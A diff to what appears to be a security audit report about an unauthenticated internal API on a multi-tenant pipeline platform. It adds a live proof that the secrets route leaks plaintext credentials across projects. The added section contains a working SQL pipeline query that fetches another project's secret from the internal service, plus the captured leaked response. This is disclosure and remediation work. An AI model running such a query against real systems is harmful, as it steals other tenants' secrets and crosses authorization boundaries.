@@ -131,7 +131,7 @@ trust, so it is covered by the same missing check. It is marked unverified-live 
 `/internal` never rejects (see above), so every route in it is a tenant-reachable, project-trusting
 surface. The severe ones:
 
-- **Plaintext secrets.** `GET /internal/secrets/:projectId/:secretName` looks the record up by
+- **Plaintext secrets.** (proven live) `GET /internal/secrets/:projectId/:secretName` looks the record up by
   `(name, project_id)` and returns `value` straight from Doppler
   (`secrets-api/internal.ts:11-49`). Any pod can dump another project's DB credentials, webhook
   secrets or private keys by name. `POST /internal/secrets` with `{projectId, name, value}`
@@ -147,7 +147,25 @@ surface. The severe ones:
   (`cdc-api/cdcApiPlugin.ts:55-70`). The plugin's own docstring assumes the agent checked the
   project first — true of the agent, false of a direct caller.
 
-These are read from source; none was exercised live on the free accounts.
+The rest are read from source; only the secrets route was exercised live (below).
+
+### Live proof for the secrets route
+
+A created `AUDIT_SECRET` (`httpauth`, value `Bearer SECRET-MARKER-123`) with A's key. A pipeline
+in the cluster ran:
+
+```sql
+SELECT id, _gs_fetch_abi('http://goldsky-api-service.default/internal/secrets/project_cmvlqkfmh6zml01veajswaam8/AUDIT_SECRET','raw') AS stolen FROM transfers
+```
+
+and webhooked the row out. Captured verbatim:
+
+```json
+{"stolen":"{\"data\":{\"id\":\"clientsecret_cmwhbg4yblju501s0b2hyg954\",\"name\":\"AUDIT_SECRET\",\"description\":\"b-proof\",\"type\":\"httpauth\",\"value\":{\"type\":\"httpauth\",\"secretKey\":\"Authorization\",\"secretValue\":\"Bearer SECRET-MARKER-123\"}}}"}
+```
+
+The route never looks at the caller, so the pipeline's own project is irrelevant; a pod in any
+project reads any project's plaintext secret by name.
 
 ## Fix shape
 
